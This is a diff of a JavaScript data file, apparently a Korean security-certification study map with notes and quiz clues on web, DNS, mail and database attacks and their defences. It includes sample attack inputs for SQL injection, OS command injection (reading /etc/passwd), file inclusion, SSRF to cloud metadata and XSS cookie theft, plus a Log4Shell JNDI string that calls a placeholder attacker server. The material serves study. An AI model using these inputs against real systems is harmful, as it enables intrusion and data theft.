+     n("l2tp","L2TP",["2계층. L2F와 PPTP를 합친 것."]),
+     n("vpnipsec","IPSec",["3계층 VPN."])
+    ],1),
+    n("wifi","무선 보안",["무선 랜의 암호화 방식.","MD5는 해시 함수라 답이 아니다."],[
+     n("wep","WEP",["RC4 사용.","24비트 IV가 짧고 평문으로 전송돼 쉽게 뚫린다."],[],1),
+     n("wpa","WPA",["TKIP."]),
+     n("wpa2","WPA2",["AES-CCMP."],[],1),
+     n("wpa3","WPA3",["AES-GCMP, SAE."])
+    ]),
+    n("e2ee","E2EE",["29회. End to End Encryption(종단 간 암호화).","보내는 기기에서 암호화하고 받는 기기에서만 복호화한다.","TLS는 내 기기↔서버 구간만 암호화(서버에서는 풀림), E2EE는 서버도 못 본다.","서버에 저장된 상태에서도 암호화가 유지된다."],[],1)
+   ])
+  ]),
+  n("s2c4","4장 취약점 점검",["라우터 ACL, Ingress·Egress 필터링 등. 정리 예정."])
+ ]),
+ n("s3","3과목 애플리케이션 보안",["인터넷 서비스(FTP·메일·웹·DNS·DB) → 웹 취약점 → 시스템 공격 → 점검."],[
+  n("s3c1","1장 인터넷 응용 보안",["FTP · 메일 · 웹 · DNS · DB. 오래된 프로토콜이라 인증이 약하고 평문으로 통신한다."],[
+   n("ftp","FTP",["연결이 두 개: 제어 채널(TCP 21, 명령)과 데이터 채널(TCP 20 등, 파일)."],[
+    n("ftpmode","동작 모드 (10회)",["데이터 연결을 누가 먼저 거느냐로 나뉜다."],[
+     n("active","Active 모드",["클라이언트가 PORT 명령으로 받을 포트를 알려 주면, 서버가 20번 포트에서 클라이언트로 먼저 연결한다.","클라이언트 방화벽에 막히기 쉽다."]),
+     n("passive","Passive 모드",["클라이언트가 PASV 명령 → 서버가 1024번 이상 임의 포트를 열고 알려 줌 → 클라이언트가 먼저 연결한다."])
+    ],1),
+    n("ftpattack","FTP 관련 공격 (2회)",["구조와 약한 인증을 노린다."],[
+     n("tftp","TFTP",["UDP 69. 인증 등 보안 기능이 없다."]),
+     n("anonftp","익명 FTP",["anonymous 계정으로 누구나 로그인한다.","쓰기 권한이 있으면 악성 파일 업로드에 악용된다. 대응: 비활성화."],[],1),
+     n("bounce","FTP Bounce",["PORT 명령에 제3자 서버의 IP·포트를 적는다. 서버는 목적지를 확인하지 않고 그쪽으로 데이터 연결을 연다.","FTP 서버가 대신 포트 스캔·공격 → 공격자 IP가 숨겨진다."],[],1)
+    ])
+   ]),
+   n("tcpwrap","TCP Wrapper",["2회. 서버 안에서 서비스 접근을 IP로 통제한다. inetd → tcpd가 먼저 검사 → 통과하면 서비스 실행.","검사 순서: /etc/hosts.allow(허용) → /etc/hosts.deny(거부) → 둘 다 없으면 허용.","보통 hosts.deny에 ALL:ALL, hosts.allow에 허용할 IP만 적는다.","라우터의 access-list와 구분."],[],1),
+   n("mail","메일 보안",["메일은 평문으로 여러 서버를 거친다 → 읽기·변조·발신자 위장이 가능하다."],[
+    n("pgp","PGP",["19회. 1991년 필 짐머만. OpenPGP(RFC 4880). 메일 프로그램 플러그인.","기밀성(암호화)·무결성·인증(전자서명). 인증기관 없이 사용자끼리 신뢰를 보증한다."],[],1),
+    n("smime","S/MIME",["인증기관(CA)이 발급한 인증서 기반 메일 보안."]),
+    n("spfdkim","SPF · DKIM · DMARC",["DNS TXT 레코드로 발신자 위조를 막는다(16회 서술).","SPF: 보낸 서버 IP가 허용 목록에 있는지. DKIM: 메일 전자서명 + DNS 공개키. DMARC: 둘을 합친 정책."])
+   ]),
+   n("webapp","웹 애플리케이션 보안",["웹 기출 단답형 묶음. 입력값을 믿어서 생기는 공격이 대부분이다."],[
+    n("forgery","스크립트 · 요청 위조",["누가 무엇을 믿는지로 구별한다."],[
+     n("xss","XSS",["Cross-Site Scripting.","입력값 검증이 부족해, 악성 스크립트가 피해자(다른 사용자) 브라우저에서 실행된다.","단서: 브라우저에서 실행, 다른 사용자의 정보 추출, 스크립트 삽입 (3·4회)."],[],1),
+     n("csrf","CSRF",["Cross-Site Request Forgery.","로그인한 사용자의 브라우저가 쿠키를 붙여, 사용자가 의도하지 않은 요청을 서버로 보낸다. 쿠키를 훔치지는 않는다.","대응: CSRF 토큰, SameSite 쿠키, Referer·Origin 검사, 중요 기능 재인증."],[],1),
+     n("ssrf","SSRF",["Server-Side Request Forgery. 28회.","서버 간 요청에 검증 안 된 입력값을 허용 → 서버가 공격자가 고른 곳으로 요청을 보낸다.","예: URL 미리보기 기능에 http://192.168.0.10/admin, 클라우드 메타데이터(169.254.169.254) 입력 → 내부망 정보 유출.","CSRF는 피해자 브라우저(Client)가, SSRF는 서버(Server)가 요청을 보낸다."],[],1)
+    ]),
+    n("inject","삽입 공격 (Injection)",["입력값이 데이터가 아니라 명령의 일부로 해석돼 실행된다.","인터프리터(DB, 셸처럼 받은 글자를 바로 실행하는 프로그램)는 어디까지가 데이터이고 어디부터 명령인지 구분하지 못한다.","OWASP Top 10 단골 (4회)."],[
+     n("sqli","SQL 삽입",["입력: ' OR '1'='1 → WHERE 조건이 항상 참 → 로그인 우회, 전체 조회.","'는 문자열을 끊고, --는 뒤를 주석으로 만든다."],[
+      n("sqlidef","SQL 삽입 대응 (22회)",["입력 단계: 클라이언트가 보낸 입력값에 특수문자(', --, ;) 검사.","쿼리 단계: 동적 쿼리 금지 → Prepared Statement(? 자리에 값만 넣음).","실행 단계: DB 애플리케이션을 최소 권한으로 구동 → 피해 최소화."],[],1)
+     ]),
+     n("oscmd","운영체제 명령어 삽입",["서버가 입력값을 셸 명령에 이어 붙여 실행할 때 생긴다. 예: 웹의 ping 진단 기능.","입력: 8.8.8.8; cat /etc/passwd → ;, |, && 뒤가 새 명령으로 실행된다.","대응: 셸을 거치지 않고 명령과 인자를 나눠 실행(Java ProcessBuilder), IP 형식만 허용, 특수문자 필터.","ICMP ping 패킷 안의 글자는 커널이 복사만 하므로 실행되지 않는다."],[],1),
+     n("fileinc","파일 삽입 (File Inclusion)",["PHP include·require가 사용자 입력으로 불러올 파일을 정할 때 생긴다.","RFI: 외부 URL의 악성 코드를 불러와 서버에서 실행. LFI: ../../etc/passwd 같은 내부 파일을 읽음.","대응(5회): 코드에 include·require 점검, php.ini에서 allow_url_fopen = Off.","묶어서 기억: allow_url_fopen → php.ini → Off."],[],1)
+    ],1),
+    n("upload","파일 업로드 · 웹 셸",["업로드 = 공격 방법, 웹 셸 = 올리는 악성 파일."],[
+     n("fupload","파일 업로드 공격",["5회. 게시판 첨부 기능으로 서버 스크립트(.php, .jsp)를 올리고, 그 주소로 접속해 서버에서 실행시킨다.","대응: 허용 확장자만 받기(화이트리스트), 업로드 폴더 실행 권한 제거, 파일명 변경, 웹 루트 밖 저장."],[],1),
+     n("webshell","웹 셸 (Web Shell)",["7회. PHP·ASP·JSP 등 서버가 실행하는 언어로 만든 악성 스크립트 파일.","서버에서 명령 실행, 원격 제어.","XSS와 구분: XSS는 피해자 브라우저에서, 웹 셸은 서버에서 실행된다."],[],1)
+    ],1),
+    n("webetc","웹 점검 · 기타 용어",["단답형 단골 용어."],[
+     n("webproxy","웹 프록시 도구",["25회. 브라우저와 서버 사이에서 요청을 붙잡아 보고 고쳐서 보낸다.","점검 = 이상한 값을 보내고 서버 반응 보기. 이걸 가능하게 해 주는 공구.","화면 검증을 우회할 수 있으므로 서버에서도 반드시 다시 검증해야 한다.","예: Burp Suite, Paros, OWASP ZAP."],[],1),
+     n("proxy","프록시 서버",["4회. 클라이언트 대신 외부 서버에 접속한다.","캐시로 속도 향상, 접근 통제, 내부 IP 숨김.","서버 앞에서 대신 받는 것은 리버스 프록시."]),
+     n("robots","robots.txt",["15회. 사이트 루트에 두고 크롤러에게 수집하지 말 경로를 알린다.","강제력이 없다. 오히려 숨긴 경로(/admin)가 드러날 수 있다.","철자 주의: robots (s)."],[],1),
+     n("deeplink","딥링크 (Deep Link)",["18회. 모바일 앱의 특정 화면을 바로 여는 링크. 예: myshop://product/1234","앱이 링크 값을 검증 없이 처리하면 카드정보·주소 등 개인정보가 노출된다.","대응: 링크 값 검증, 민감 화면 재인증, App Links·Universal Links."],[],1),
+     n("apachelog","아파치 로그",["19회. Access Log: 모든 요청(IP, 시간, 요청, 상태 코드).","Error Log: 서버 오류.","설정 파일 httpd.conf → CustomLog(접속 로그 경로), ErrorLog(에러 로그 경로).","IIS는 W3SVC1(웹 로그), HTTPERR(에러)."],[],1)
+    ])
+   ]),
+   n("dns","DNS",["도메인 ↔ IP 변환.","DNS 문제를 다 푼 뒤 공격(스푸핑 등)을 더 채운다."],[
+    n("zone","존 파일 · 자원 레코드 (7회)",["존 파일: DNS 서버가 맡은 구역의 레코드를 저장하는 파일(전화번호부 책 한 권).","자원 레코드(RR): 이름 → 값 한 줄.","A(IPv4), AAAA(IPv6), CNAME(별명), MX(메일 서버), NS(DNS 서버), PTR(IP→도메인), SOA(존 기본 정보), TXT(SPF·DKIM)."],[],1),
+    n("dnscache","DNS 캐싱 · TTL (8회)",["조회 결과를 캐시에 TTL(유효 시간)만큼 저장해 두고 다시 쓴다.","TTL이 지나면 지우고 다시 묻는다. IP가 바뀔 수 있어서 기한을 둔다."],[],1),
+    n("nsflow","네임 서버 종류 (26회)",["주소를 물으면 위에서부터 한 단계씩 내려가며 찾는다."],[
+     n("cachens","캐시 DNS 서버",["사용자 PC가 처음 묻는 곳(통신사 DNS 등). 조회 결과를 캐시에 잠깐 저장한다.","캐시에 없으면 루트 → TLD → 책임 네임 서버 순서로 대신 찾아 준다.","캐시 포이즈닝의 표적."],[],1),
+     n("rootns","루트 네임 서버",["맨 꼭대기. .com, .kr 같은 TLD 서버가 어디 있는지 안다."]),
+     n("tldns","TLD 네임 서버",[".com, .org, .net, .kr 등 최상위 도메인을 관리한다.","jian.com을 맡은 책임 서버가 어디인지 안다."]),
+     n("authns","책임 네임 서버 (Authoritative)",["특정 도메인의 DNS 정보를 직접 관리한다. 존 파일을 가진 서버 = 최종 정답.","주 DNS 서버 + 부 DNS 서버(백업, 존 전송으로 동기화).","철자: Authoritative."],[],1)
+    ],1),
+    n("dnsspoof","DNS 스푸핑 (17회)",["가짜 DNS 응답으로 사용자를 가짜 사이트로 보낸다.","사용자가 질의 → 공격자가 진짜 응답보다 먼저 가짜 IP를 응답 → 먼저 온 응답을 믿고, 늦게 온 진짜는 버린다.","DNS는 UDP라 응답이 진짜인지 확인하지 않는다.","캐시 포이즈닝: DNS 서버의 캐시에 가짜 IP를 넣어 TTL 동안 모든 사용자가 당한다.","대응: DNSSEC(DNS 응답에 전자서명)."],[],1),
+    n("subtake","서브 도메인 하이재킹 (20회)",["다른 이름: 서브 도메인 테이크오버(Subdomain Takeover).","shop.jian.com → CNAME → jian-shop.클라우드.com 으로 쓰다가 클라우드 서비스만 해지하고 CNAME 레코드는 남김.","공격자가 같은 이름(jian-shop)으로 클라우드에 재등록 → shop.jian.com이 공격자 페이지를 보여 줌(피싱, 쿠키 탈취).","대응: 서비스를 끊을 때 DNS 레코드도 함께 삭제, 주기적 DNS 점검."],[],1),
+    n("hostsfile","hosts 파일 (9회)",["도메인 → IP를 수동으로 지정하는 파일. 모든 OS에 있다.","조회 순서: hosts 파일 → DNS 캐시 → DNS 서버. DNS보다 먼저 본다.","위치: 리눅스 /etc/hosts, 윈도우 C:\\Windows\\System32\\drivers\\etc\\hosts","악성코드가 바꾸면 은행 주소를 가짜 IP로 보낸다(파밍).","TCP Wrapper의 hosts.allow·hosts.deny와 이름만 비슷하다."],[],1)
+   ]),
+   n("db","데이터베이스 보안",["DB에는 돈·개인정보 같은 가장 중요한 데이터가 있다."],[
+    n("dbctl","DB 보안 통제 3가지 (11회)",["답은 모두 ○○ 통제. 직접 보기 → 간접 알아내기 → 밖으로 새기, 이 세 길을 하나씩 막는다."],[
+     n("accctl","접근 통제",["누가 어느 테이블에 무엇을 할 수 있는지 권한을 관리한다(GRANT·REVOKE).","막는 길: 볼 권한 없는 데이터를 직접 보기."]),
+     n("infctl","추론 통제",["볼 수 있는 데이터를 조합해 못 보는 민감 정보를 알아내는 것을 막는다.","예: 부서 평균 급여와 인원을 알면 1인 부서의 개인 급여가 드러난다.","대응: 허용 질의 제한, 응답 데이터 한정."],[],1),
+     n("flowctl","흐름 통제",["높은 등급(기밀) 정보가 낮은 등급 저장소로 흘러가는 것을 검사한다.","예: 기밀 테이블을 아무나 볼 수 있는 테이블로 복사하는 것 차단."],[],1)
+    ],1),
+    n("dbenc","DB 암호화 방식 (24회)",["암호화를 어디에서 하느냐로 나뉠다. 앱 서버 → DB 서버 → DBMS 내부 → OS 순으로 점점 아래로."],[
+     n("encapi","API 방식",["암호화 모듈을 라이브러리로 애플리케이션 서버에 설치. 프로그램이 직접 호출해 암호화한 뒤 DB에 저장.","장점: DB 서버 부담 없음. 단점: 앱 코드를 고쳐야 함."],[],1),
+     n("encplug","Plug-in 방식",["암호화 모듈을 DB 서버에 설치하고 DBMS가 플러그인으로 호출.","장점: 앱 코드 수정 적음. 단점: DB 서버 부담.","Hybrid: API + Plug-in 함께."]),
+     n("enctde","TDE 방식",["Transparent Data Encryption. DBMS에 내장된 암호화 기능 사용.","파일에 쓸 때 암호화, 읽을 때 복호화 → 앱은 모름(투명).","예: Oracle TDE, MS-SQL TDE."],[],1),
+     n("encos","운영체제 방식",["OS의 파일 입출력 단계에서 암호화(디스크·파일 단위)."])
+    ],1),
+    n("dbatk","DB 공격 유형 (12회)",["통제와 짝을 이룬다: 추론 공격 ↔ 추론 통제."],[
+     n("aggr","집합성 (Aggregation) 공격",["낮은 등급 정보 조각을 모아(합쳐) 높은 등급 정보를 알아낸다.","예: 공개된 지사별 매출을 더해 기밀인 총매출을 알아냄.","핵심: 더하기(모으기)."],[],1),
+     n("infer","추론 (Inference) 공격",["기밀이 아닌 정보를 보고 기밀 정보를 유추한다.","예: 임원 전용기 예약 목적지를 보고 비밀 인수 협상 상대를 알아냄.","핵심: 순서가 다른 정보로 짐작. 대응은 추론 통제."],[],1),
+     n("diddle","데이터 디들링 (Data Diddling)",["처리할 자료를 다른 자료로 바꿔치기해서 처리한다(입력 단계 변조).","예: 급여 입력 직전에 금액을 바꾼, 의사결정 지표 변경.","diddle = 속이다, 조작하다."],[],1)
+    ],1)
+   ])
+  ]),
+  n("s3c2","2장 애플리케이션 보안 취약점",["취약점을 부르는 이름과 관리 방법."],[
+  n("cve","CVE",["Common Vulnerabilities and Exposures. 공개된 취약점에 붙는 고유 번호(4회).","형식: CVE-연도-번호. 예: CVE-2014-6271 (Shellshock).","연도 = 취약점이 등록(번호를 받은) 해, 번호 = 그 해의 일련번호(4자리 이상).","미국 MITRE가 운영. 같은 취약점을 전 세계가 같은 이름으로 부르기 위한 것."],[],1),
+  n("cvss","CVSS",["17회. Common Vulnerability Scoring System = 취약점 점수 체계.","CVE가 번호(이름)라면 CVSS는 심각도 점수(0~10, 10이 가장 심각).","기본(Base): 취약점 자체의 위험도. 시간(Temporal): 공격 코드·패치 여부처럼 시간에 따라 바뀜. 환경(Environmental): 우리 회사 환경에서의 중요도."],[],1),
+  n("heartbleed","하트블리드 (Heartbleed)",["23회. CVE-2014-0160. OpenSSL의 Heartbeat 확장 취약점.","정상: 클라이언트가 \"bird(4글자)\"를 보내면 서버가 그대로 \"bird\"를 돌려줌(연결 살아 있니? 확인).","공격: \"bird(500글자)\"라고 길이를 속임 → 서버가 길이를 검증하지 않고 메모리에서 500글자를 읽어 돌려줌 → 비밀번호·쿠키·개인키까지 떨어져 나옴(최대 64KB).","대응: OpenSSL 패치(1.0.1g 이상), 인증서 재발급."],[],1),
+  n("log4j","Log4j · Log4Shell",["24회. Log4j = 아파치의 자바 로깅 라이브러리. 취약점 이름은 Log4Shell(CVE-2021-44228, CVSS 10.0).","정상: 로그 문자열 안의 ${...}를 편의 기능으로 해석해 값을 채워 넣는다(Lookup).","공격: User-Agent 등 로그에 남을 값에 ${jndi:ldap://공격자서버/a} 입력 → 로그를 남기는 순간 JNDI가 공격자 LDAP 서버에서 자바 클래스를 받아 실행 → 원격 코드 실행(RCE).","대응: Log4j 2.17 이상으로 업데이트, JNDI Lookup 비활성화."],[],1),
+  n("poodle","POODLE",["15회. Padding Oracle On Downgraded Legacy Encryption.","중간자가 TLS 연결을 일부러 실패시켜 SSL 3.0으로 내려가게(다운그레이드) 한 뒤, CBC 패딩 검사의 빈틈을 이용해 암호문을 한 바이트씩 풀어낸다(쿠키 탈취).","패딩 오라클: 서버가 패딩이 맞는지 아닌지 대답해 주는 것을 힌트로 삼는 공격.","대응: SSL 3.0 비활성화, TLS_FALLBACK_SCSV(다운그레이드 차단)."],[],1)
+ ]),
+  n("s3c3","3장 시스템 공격 기법",["버퍼 오버플로 등. 아직 안 풀었다."]),
+  n("s3c4","4장 취약점 점검",["웹 서버·쿠키 설정 점검."],[
+   n("cookiesess","쿠키 · 세션",["HTTP는 요청마다 사용자를 기억하지 못한다. 그래서 로그인 상태를 이어 가는 표시가 필요하다.","세션 ID를 담은 쿠키 = 로그인 출입증. 훔치면 비밀번호 없이 그 사람으로 로그인된다."],[
+    n("ckflow","로그인 흐름",["로그인 → 서버가 세션을 만들어 저장 → Set-Cookie로 세션 ID 전달 → 브라우저가 쿠키로 저장 → 이후 요청마다 Cookie 헤더로 자동 전송."]),
+    n("cksvs","쿠키 vs 세션",["쿠키: 브라우저(사용자 PC)에 저장. 사용자가 보고 바꿀 수 있어 약하다.","세션: 서버에 저장. 실제 로그인 정보를 담는다.","세션 ID는 랜덤하게 만들어야 한다(21회 기출)."]),
+    n("ckattr","쿠키 보안 속성",["Set-Cookie 헤더에 붙이는 옵션. 16·22·28회 기출.","예: Set-Cookie: ID=abc; Secure; HttpOnly"],[
+     n("secure","Secure",["쿠키가 HTTPS 연결에서만 전송되도록 제한한다.","막는 공격: 스니핑, 중간자 공격(MITM)."],[],1),
+     n("httponly","HttpOnly",["자바스크립트(document.cookie)로 쿠키에 접근하지 못하게 한다.","막는 공격: XSS로 쿠키 탈취.","Java: cookie.setHttpOnly(true)"],[],1),
+     n("expires","Expires",["쿠키 만료 시간을 정한다.","짧게 두면 탈취당해도 금방 무효가 된다."],[],1),
+     n("samesite","SameSite",["다른 사이트에서 시작된 요청에 쿠키를 붙일지 정한다.","막는 공격: CSRF. (기출에는 아직 없음)"])
+    ],1),
+    n("ckattack","쿠키를 노리는 공격",["쿠키를 훔치거나, 바꾸거나, 자동 전송을 악용한다."],[
+     n("xsssteal","XSS로 탈취",["게시판에 심은 스크립트가 읽는 사람의 document.cookie를 공격자에게 보낸다.","점검: <script>alert(document.cookie)<\/script>","대응: HttpOnly, 입력값 필터링."]),
+     n("xst","XST",["Cross-Site Tracing. TRACE 메서드는 받은 요청을 그대로 돌려주므로, 요청에 붙은 쿠키도 응답에서 읽힌다.","HttpOnly를 우회할 수 있다.","대응: TRACE 메서드 비활성화."]),
+     n("cktamper","쿠키 변조",["쿠키에 권한 값(role=user)을 담으면 사용자가 role=admin으로 바꿀 수 있다.","대응: 중요한 정보는 서버 쪽 세션에 저장."])
+    ])
+   ],1)
+  ])
+ ]),
+ n("s4","4과목 보안관제 · 침해대응",["아직 안 풀었다."],[
+  n("s4c1","1장 보안 도구",[]),
+  n("s4c2","2장 로그 및 침해사고 분석",[])
+ ]),
+ n("s5","5과목 정보보안 일반",["아직 안 풀었다."],[
+  n("s5c1","1장 암호학",[]),
+  n("s5c2","2장 인증 · 접근통제",[]),
+  n("s5c3","3장 기타",[])
+ ]),
+ n("s6","6과목 위험분석 · 관리",["아직 안 풀었다."],[
+  n("s6c1","1장 정보보호 및 위험관리",[]),
+  n("s6c2","2장 ISMS-P · 정보보호제품 인증",[]),
+  n("s6c3","3장 인증제도",[])
+ ]),
+ n("s7","7과목 정보보안 법규",["아직 안 풀었다."],[
+  n("s7c1","1장 국가기반 · 서비스 보안 법규",[]),
+  n("s7c2","2장 개인정보보호 법규",[])
+ ])
+]);
+var LEFT=['s2','s5','s6'];
+
+var LINKS=[['3way','synflood'],['3way','half'],['3way','open'],['3way','seq'],['3way','rtt'],['seq','hijack'],['seq','ah'],
+ ['arpcache','arpspoof'],['arpreq','l2'],['rarp','arp'],['arpspoof','jamming'],['jamming','swmode'],['jamming','promisc'],['l2','swmode'],
+ ['echo','smurf'],['dbcast','smurf'],['smurf','land'],['frag','teardrop'],['l3','ipsec'],['l4','tcpudp'],
+ ['crlf','slowloris'],['crlf','split'],['clte','smuggle'],['cookie','csrf'],['csrf','xss'],['csrf','ssrf'],
+ ['udp','dtls'],['udp','reflect'],['udp','snmp'],['snmp','siem'],['syslog','siem'],['snmp','syslog'],['promisc','nids'],
+ ['slowloris','rudy'],['rudy','slowread'],['idsmodel','ips'],['esm','siem'],['siem','soar'],['flags','stealth'],['flags','half'],
+ ['esp','vpnipsec'],['tls','dtls'],
+ ['learning','jamming'],['flooding','jamming'],['swfunc','swmode'],['vlanwhy','arpreq'],['routing','l3'],['eigrp','frag'],
+ ['cookie','cookiesess'],['httponly','xsssteal'],['xsssteal','xss'],['samesite','csrf'],['secure','tls'],['hijack','cookiesess'],['v3time','ah'],
+ ['xss','webshell'],['fupload','webshell'],['fupload','fileinc'],['sqli','oscmd'],['webproxy','proxy'],['csrf','ssrf'],
+ ['bounce','active'],['spfdkim','zone'],['hostsfile','tcpwrap'],['dnsspoof','dnscache'],['subtake','zone'],['authns','zone'],['infer','infctl'],['poodle','tls'],['cvss','cve'],['heartbleed','tls'],['log4j','cvss'],['log4j','inject'],['dga','dns'],['aggr','infer'],['cachens','dnscache'],['dnsspoof','arpspoof'],['hostsfile','dnscache'],['dnscache','dnsamp'],['udp','dns'],['apachelog','webetc']];
+
+var CLUES={
+l1:"0과 1을 전기·빛·전파 신호로 보내는 계층과 그 데이터 단위는?",
+l2:"MAC 주소가 붙고 스위치가 보는 계층과 그 데이터 단위는?",
+l3:"IP 주소가 붙고 라우터가 보는 계층과 그 데이터 단위는?",
+l4:"포트 번호·SEQ·ACK가 붙는 계층과 TCP/UDP 각각의 데이터 단위는?",
+frag:"패킷이 MTU(이더넷 1500바이트)보다 크면 3계층에서 여러 조각으로 나누고, 받는 쪽은 Offset을 보고 다시 합친다. 이 과정은?",
+udp:"연결 없이 데이터그램을 보내고 발신자 확인이 없어 출발지 위조가 쉬운, 반사 공격에 쓰이는 4계층 프로토콜은?",
+"3way":"TCP 연결 수립 절차의 이름과 세 단계 플래그 순서는?",
+seq:"클라이언트 SEQ 4551을 받은 서버가 응답할 때 ACK 값은? (원리: 상대 번호 + ?)",
+flags:"연결 요청 / 수신 확인 / 정상 종료 / 강제 종료 / 즉시 전달 / 긴급을 뜻하는 TCP 플래그 6개는?",
+arpreq:"상대 MAC을 몰라 목적지 MAC을 FF:FF:FF:FF:FF:FF로 보내 네트워크 전체에 묻는 메시지는?",
+arpcache:"알아낸 IP–MAC 쌍을 저장하는 표로, ARP 스푸핑이 바꾸는 대상은?",
+rarp:"하드디스크 없는 장비가 MAC 주소로 IP 주소를 알아내는 프로토콜은?",
+dbcast:"외부 네트워크에서 특정 네트워크 전체로 보내는 브로드캐스트는? (철자 주의)",
+crlf:"HTTP에서 0D0A가 두 번 연속 나오면 헤더가 끝난다. 0D·0A 줄바꿈 문자를 합쳐 부르는 이름은?",
+cookie:"브라우저는 요청을 만든 페이지가 어디든, 목적지 도메인에 맞는 쿠키를 붙여 보낸다. 이 성질을 악용하는 공격(①)과 막는 쿠키 속성(②)은?",
+cut:"목적지 MAC 주소만 읽고 바로 내보내는, 가장 빠르지만 오류 프레임도 보내는 스위치 전송 방식은?",
+ffree:"프레임 앞 64바이트까지만 받고 내보내 충돌로 깨진 짧은 프레임을 거르는 스위치 전송 방식은?",
+snf:"프레임 전체를 받아 CRC 오류를 검사한 뒤 내보내는, 가장 느리지만 정확한 스위치 전송 방식은?",
+learning:"들어온 포트와 출발지 MAC을 MAC 주소 테이블에 저장하는 스위치 기능은?",
+flooding:"목적지 MAC이 테이블에 없을 때 들어온 포트를 뺀 모든 포트로 보내는 스위치 기능은?",
+forwarding:"목적지 MAC이 테이블에 있어서 그 포트로만 보내는 스위치 기능은?",
+filtering:"목적지가 들어온 포트와 같은 쪽이면 다른 포트로 보내지 않는 스위치 기능은?",
+aging:"일정 시간 쓰이지 않은 MAC 테이블 항목을 지우는 스위치 기능은?",
+vlanwhy:"VLAN을 쓰는 목적 3가지는?",
+vport:"스위치 포트별로 VLAN을 할당하는 정적 VLAN 구성 방식은?",
+vmac:"호스트 MAC 주소로 VLAN을 정하는 동적 VLAN 구성 방식은?",
+rip:"거리 벡터 방식, 홉 수 메트릭, 최대 15홉인 IGP 라우팅 프로토콜은?",
+ospf:"링크 상태 방식, 다익스트라 알고리즘으로 최단 경로를 계산하는 IGP는?",
+eigrp:"시스코가 IGRP를 개선했고 대역폭·지연·신뢰도·부하·MTU를 메트릭으로 쓰는 프로토콜은?",
+bgp:"AS와 AS 사이에서 경로 정보를 주고받는 EGP 프로토콜은?",
+as:"한 기관이 직접 관리하는 네트워크 덩어리로 고유 번호를 받는 단위는?",
+promisc:"네트워크 카드가 자기에게 오지 않은 프레임까지 받는 모드로, 스니핑과 NIDS가 쓰는 것은?",
+polling:"SNMP Manager가 Agent에게 정보를 요청하는 방식과 Agent가 받는 포트는?",
+trap:"SNMP Agent가 이벤트를 먼저 알리는 방식과 Manager가 받는 포트는?",
+v3time:"SNMPv3에서 메시지 생성 시점을 확인해 오래된 메시지를 버리는 매개변수와 막는 공격은?",
+v3auth:"SNMPv3에서 송신자를 인증하고 무결성 값을 붙이는 매개변수와 막는 공격은?",
+v3priv:"SNMPv3에서 내용을 암호화하는 매개변수와 막는 공격은?",
+syslog:"장비의 이벤트를 자기 로그에 저장하면서 원격 서버로도 보내는 로그 프로토콜은?",
+open:"SYN → SYN+ACK → ACK로 연결을 끝까지 맺어 로그가 남는 스캔은?",
+half:"SYN+ACK를 받으면 RST로 바로 끊어 로그가 남지 않는 스캔은?",
+fin:"정상 종료를 뜻하는 플래그 하나만 켜서 보내고, 닫힌 포트는 RST·열린 포트는 무응답인 스텔스 스캔은?",
+null:"플래그를 모두 끄고 보내는 스텔스 스캔은?",
+xmas:"FIN·URG·PSH를 켜서 보내는 스텔스 스캔은?",
+jamming:"가짜 MAC을 대량으로 보내 스위치 MAC 테이블을 채워 더미 허브처럼 만드는 공격은?",
+arpspoof:"위조한 ARP Reply로 피해자 ARP 캐시의 MAC을 공격자 MAC으로 바꾸는 공격과 대응 명령은?",
+hijack:"시퀀스 번호를 알아내 RST로 기존 연결을 끊고 인증 없이 연결을 가로채는 공격은?",
+synflood:"연결 요청만 계속 보내고 마지막 확인 응답은 보내지 않아 서버의 연결 대기열(Backlog Queue)을 가득 채우는 공격은?",
+land:"출발지 IP와 목적지 IP를 같게 만들어 자기 자신에게 응답하게 하는 공격은?",
+teardrop:"Fragment Offset을 겹치게 조작해 재조립 중 오류를 일으키는 공격은?",
+smurf:"출발지를 피해자로 위조한 ICMP Echo Request를 Directed Broadcast로 보내 응답을 몰리게 하는 공격은?",
+memcached:"최대 51,000배 증폭되는 반사 공격 서비스와 UDP 포트는?",
+ntp:"monlist 명령(최근 접속자 600개 응답)을 악용하는 반사 공격 서비스와 포트는?",
+ssdp:"UPnP 장치 검색 요청(…:all)을 악용해 최대 30배 증폭되는 반사 공격 서비스와 UDP 포트는?",
+slowloris:"헤더 끝 표시(0D0A0D0A)를 보내지 않아 연결을 계속 붙잡는 Slow DoS는?",
+rudy:"요청 본문(Body)을 아주 천천히 보내는 Slow DoS는?",
+slowread:"TCP 윈도우 크기를 작게 해서 서버 응답을 아주 천천히 받아 연결을 붙잡는 서비스 거부 공격은?",
+split:"입력값에 %0D%0A를 넣어 응답 헤더를 일찍 끝내고, 그 뒤에 공격자가 만든 가짜 응답을 이어 붙이는 공격은?",
+cl_te:"Request Smuggling에서 프론트엔드는 Content-Length, 백엔드는 chunked로 끝을 판단하는 유형은?",
+te_cl:"Request Smuggling에서 프론트엔드는 chunked, 백엔드는 Content-Length로 끝을 판단하는 유형은?",
+dga:"악성코드와 C&C가 같은 알고리즘·시드로 매일 도메인 수천 개를 만들어 차단을 피하는 기법은?",
+misuse:"알려진 공격 패턴(시그니처)과 비교해 오탐은 적지만 새 공격은 못 잡는 탐지 방식은?",
+anomaly:"평소와 다른 행동을 찾아 새 공격도 잡지만 오탐이 많은 탐지 방식은?",
+fp:"정상을 공격으로 잘못 판단하는 것은?",
+fn:"공격을 정상으로 잘못 판단하는 것은?",
+hids:"서버에 설치해 로그와 파일 무결성으로 탐지하는 IDS는?",
+nids:"네트워크에 설치해 패킷으로 탐지하고 암호화된 내용은 못 보는 IDS는?",
+nac:"네트워크 접속 전에 기기를 검사해 허가되지 않거나 감염된 기기를 차단하는 솔루션은?",
+esm:"여러 보안 장비를 통합 관리하고 Agent·Manager·Console로 구성되는 것은?",
+siem:"모든 로그를 빅데이터로 수집·연관 분석하는 솔루션은?",
+soar:"탐지된 위협에 플레이북으로 자동 대응하는 솔루션은?",
+tms:"외부 위협 정보를 모아 미리 경보하는 시스템은?",
+record:"TLS Record 프로토콜의 처리 순서 5단계는?",
+rtt:"TLS 1.2 / TLS 1.3 첫 연결 / TLS 1.3 세션 재개에 필요한 왕복 횟수는?",
+dtls:"UDP 데이터그램 환경에서 쓰는 TLS는?",
+ah:"IPSec에서 인증·무결성만 제공하고 암호화는 하지 않으며 Sequence Number로 재전송을 막는 프로토콜은?",
+esp:"IPSec에서 인증·무결성에 기밀성(암호화)까지 제공하는 프로토콜은?",
+transport:"IPSec에서 페이로드만 보호하고 호스트 간에 쓰는 모드는?",
+tunnel:"IPSec에서 패킷 전체를 보호하고 새 IP 헤더를 붙여 게이트웨이 간에 쓰는 모드는?",
